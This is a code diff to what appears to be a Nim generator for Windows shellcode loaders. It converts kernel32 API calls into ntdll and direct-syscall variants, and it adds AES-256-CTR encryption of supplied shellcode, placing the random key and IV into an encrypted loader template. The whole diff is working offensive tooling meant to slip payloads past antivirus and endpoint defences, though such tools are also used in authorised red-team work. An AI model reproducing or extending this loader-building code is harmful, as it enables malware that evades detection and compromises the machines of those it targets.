@@ -1,5 +1,8 @@
 import yaml/serialization, streams
-import terminal, strutils, strformat, sequtils
+import terminal, strutils, strformat, sequtils, random
+import nimcrypto
+import nimcrypto/sysrand
+import sugar
 
 type Technique = object
   name: string
@@ -100,19 +103,27 @@ proc colored_print(to_print: string, color: ForegroundColor): void =
   echo to_print
   setForegroundColor(fgWhite)
 
-proc indent_lines(lines: string, indent: int): string = 
+proc indent_lines(lines: string, indent: int, ignore_first: bool): string = 
   var indented = newSeq[string]()
-  
+  var count = 0
+
   for i in lines.split("\n"):
+    if count == 0 and ignore_first:
+      indented.add(i)
+      count += 1
+      continue
     indented.add(" ".repeat(indent) & i)
-  
+
   return join(indented, "\n")
 
-proc get_modules(technique: string, variation: string): string = 
+proc get_modules(technique: string, variation: string, shellcode_type: string): string = 
   var modules = newseq[string]()
   modules.add("import base64")
   modules.add("import winim")
   modules.add("import winim/lean")
+
+  if shellcode_type == "true":
+    modules.add("import nimcrypto")
 
   if variation == "syscalls":
     modules.add("include utils/syscalls")
@@ -132,14 +143,55 @@ proc get_modules(technique: string, variation: string): string =
 proc k32_to_nt(call: string, ntdll_calls: seq[NtdllCalls]): string = 
   for i in ntdll_calls:
     if i.name == call:
+      coloredPrint(fmt"[-] Converted {call} into {i.ntdll}", fgGreen)
       return i.ntdll
-  return ""
+  coloredPrint(fmt"[-] No NT API call for {call}", fgYellow)
+  return call
 
 proc nt_to_syscall(call: string, syscalls: seq[Syscalls]): string = 
   for i in syscalls:
     if i.name == call:
       return i.syscall_hex
   return ""
+
+func toByteSeq*(str: string): seq[byte] {.inline.} =
+    @(str.toOpenArrayByte(0, str.high))
+
+proc get_shellcode_template(sc_format: string, shellcode: string): string =
+  var shellcode_template = readFile("templates/vanilla_shellcode.nim")
+  if sc_format == "false":
+    shellcode_template = shellcode_template.replace("REPLACE_SHELLCODE", shellcode) 
+    return indent_lines(shellcode_template, 2, true)
+
+  shellcode_template = readFile("templates/encrypted_shellcode.nim")
+
+  var
+    key: array[aes256.sizeKey, byte]
+    iv: array[aes256.sizeBlock, byte]
+    data: seq[byte] = toByteSeq(decode(shellcode))
+    plaintext = newSeq[byte](len(data))
+    enctext = newSeq[byte](len(data))
+
+  let chars = {'a'..'z','A'..'Z'}
+  randomize()
+  var envkey = collect(newSeq, (for i in 0..<32: chars.sample)).join
+  
+  discard randomBytes(addr iv[0], 16)
+  copyMem(addr plaintext[0], addr data[0], len(data))
+
+  var expandedkey = sha256.digest(envkey)
+  copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
+ 
+  var ectx: CTR[aes256] 
+  ectx.init(key, iv)
+  ectx.encrypt(plaintext, enctext)
+  ectx.clear()
+  
+  shellcode_template = shellcode_template.replace("REPLACE_PASS", envkey)
+  shellcode_template = shellcode_template.replace("REPLACE_IV", encode(iv))
+  shellcode_template = shellcode_template.replace("REPLACE_ENC", encode(enctext))
+  
+  return indent_lines(shellcode_template, 2, true)
  
 proc get_init_setup(technique: string, technique_list: seq, variation: string): string = 
   let setup_list = init_setup("models/init_setup.yml")
@@ -158,17 +210,17 @@ proc get_init_setup(technique: string, technique_list: seq, variation: string): 
   if variation == "ntdll":
     for i in calls:
       var api_call = i.split(" - ")[0] 
-      api_call = k32_to_nt(api_call, ntdll_calls)
-      if api_call != "":
-        setup_contents = readFile(fmt"inits/{api_call}.nim")
+      var temp = k32_to_nt(api_call, ntdll_calls)
+      if api_call != temp:
+        setup_contents = readFile(fmt"inits/{temp}.nim")
         combined_setup.add(setup_contents)
 
   if variation == "gstub":
     for i in calls:
       var api_call = i.split(" - ")[0] 
-      api_call = k32_to_nt(api_call, ntdll_calls)
-      if api_call != "":
-        setup_contents = readFile(fmt"inits/gstub{api_call}.nim")
+      var temp = k32_to_nt(api_call, ntdll_calls)
+      if api_call != temp:
+        setup_contents = readFile(fmt"inits/gstub{temp}.nim")
         combined_setup.add(setup_contents)
   
   return join(combined_setup, "\n")
@@ -187,7 +239,7 @@ proc get_gstub_init(calls: seq[string], ntdll_calls: seq[NtdllCalls]): string =
   for call in calls:
     var api_call = call.split(" - ")[0] 
     var temp = k32_to_nt(api_call, ntdll_calls)
-    if temp != "":
+    if api_call != temp:
       if count != 1:
          temp_template = gstub_offset_template.replace("REPLACE_COUNT", intToStr(count))
          temp_template = temp_template.replace("REPLACE_PREV", intToStr(prev))
@@ -223,9 +275,8 @@ proc build_template(technique: string, technique_list: seq, variation: string): 
   # Setup API calls
   for call in calls:
     var api_call = call.split(" - ")[0]
-    var temp = k32_to_nt(api_call, ntdll_calls)
-    if contains(ntdll_variations, variation) and temp != "":
-      api_call = temp
+    if contains(ntdll_variations, variation): 
+      api_call = k32_to_nt(api_call, ntdll_calls)
 
     content = ""
     for custom_arg in arguments:
@@ -243,7 +294,7 @@ proc build_template(technique: string, technique_list: seq, variation: string): 
     api_template.add(content)
 
   var compiled_api = join(api_template, "")
-  compiled_api = indent_lines(compiled_api, 2)
+  compiled_api = indent_lines(compiled_api, 2, false)
   
   payload_template = payload_template.replace("REPLACE_TECHNIQUE_NAME", technique)
   payload_template = payload_template.replace("REPLACE_API_CALLS", compiled_api)
